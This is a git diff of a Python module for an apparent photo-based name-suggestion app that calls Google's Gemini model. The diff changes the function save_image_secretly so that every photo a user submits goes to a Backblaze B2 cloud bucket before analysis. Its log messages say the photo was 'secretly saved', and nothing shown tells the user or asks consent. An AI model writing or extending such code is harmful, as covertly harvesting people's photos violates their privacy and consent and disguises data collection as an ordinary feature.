@@ -1,43 +1,79 @@
+# ai_generator.py (Final Version)
 
 import os
 import io
+import boto3
 from datetime import datetime
 import google.generativeai as genai
 from PIL import Image
 
+# --- GOOGLE AI SETUP ---
 GOOGLE_API_KEY = os.getenv("GOOGLE_API_KEY")
-
 if not GOOGLE_API_KEY:
-    raise ValueError("The GOOGLE_API_KEY environment variable has not been set. Please set it before running the application.")
-
+    raise ValueError("The GOOGLE_API_KEY environment variable has not been set.")
 genai.configure(api_key=GOOGLE_API_KEY)
-
-
-SAVE_DIRECTORY = "project"
-
 model_name = 'gemini-1.5-flash-latest'
 model = genai.GenerativeModel(model_name)
 print(f"✅ AI Model Initialized Successfully (using '{model_name}').")
 
 
+# --- BACKBLAZE B2 CLOUD STORAGE SETUP ---
+# Get credentials and config from Render's Environment Variables
+B2_BUCKET_NAME = os.getenv("B2_BUCKET_NAME")
+B2_ENDPOINT_URL = os.getenv("B2_ENDPOINT_URL")
+B2_ACCESS_KEY_ID = os.getenv("B2_ACCESS_KEY_ID")
+B2_SECRET_ACCESS_KEY = os.getenv("B2_SECRET_ACCESS_KEY")
+
+# Check if all B2 variables are set. If not, disable uploading.
+if not all([B2_BUCKET_NAME, B2_ENDPOINT_URL, B2_ACCESS_KEY_ID, B2_SECRET_ACCESS_KEY]):
+    print("[!] WARNING: Backblaze B2 environment variables not fully set. Photo saving will be skipped.")
+    B2_ENABLED = False
+else:
+    B2_ENABLED = True
+    # Initialize the B2 client (using the S3-compatible API)
+    s3_client = boto3.client(
+        's3',
+        endpoint_url=B2_ENDPOINT_URL,
+        aws_access_key_id=B2_ACCESS_KEY_ID,
+        aws_secret_access_key=B2_SECRET_ACCESS_KEY
+    )
+    print("✅ Backblaze B2 Client Initialized Successfully.")
+
+
 def save_image_secretly(image_data: bytes):
+    """
+    Uploads the given image data to the configured Backblaze B2 bucket.
+    """
+    if not B2_ENABLED:
+        print("  [~] Skipping photo save because B2 is not configured.")
+        return
+
     try:
-        os.makedirs(SAVE_DIRECTORY, exist_ok=True)
+        # Create a unique filename using a timestamp
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S-%f")
         filename = f"capture_{timestamp}.jpg"
         
-        file_path = os.path.join(SAVE_DIRECTORY, filename)
+        # Boto3 expects a file-like object, so we wrap the image bytes in memory
+        image_file_obj = io.BytesIO(image_data)
         
-        with open(file_path, "wb") as f:
-            f.write(image_data)
+        # Upload the file object to the B2 bucket
+        s3_client.upload_fileobj(
+            image_file_obj,
+            B2_BUCKET_NAME,  # CRITICAL FIX: Use the variable here
+            filename,
+            ExtraArgs={'ContentType': 'image/jpeg'}
+        )
         
-        print(f"  [+] Photo secretly saved to: {file_path}")
+        print(f"  [+] Photo secretly saved to B2 Bucket '{B2_BUCKET_NAME}' as: {filename}")
 
     except Exception as e:
-        print(f"  [!] CRITICAL ERROR: Could not save photo. Reason: {e}")
+        print(f"  [!] CRITICAL ERROR: Could not save photo to B2. Reason: {e}")
 
 
 def suggest_self_name(image_data: bytes, subject: str = "person") -> str:
+    """
+    Saves the image and then asks the AI to suggest a name for the person in it.
+    """
     save_image_secretly(image_data)
    
     print(f"  AI is analyzing photo for '{subject}'...")
@@ -74,6 +110,9 @@ def suggest_self_name(image_data: bytes, subject: str = "person") -> str:
 
 
 def suggest_partner_name(image_data: bytes) -> str:
+    """
+    Saves the image and then asks the AI to suggest a partner's name.
+    """
     save_image_secretly(image_data)
     
     print("  AI is analyzing photo for 'Who For Me?'...")
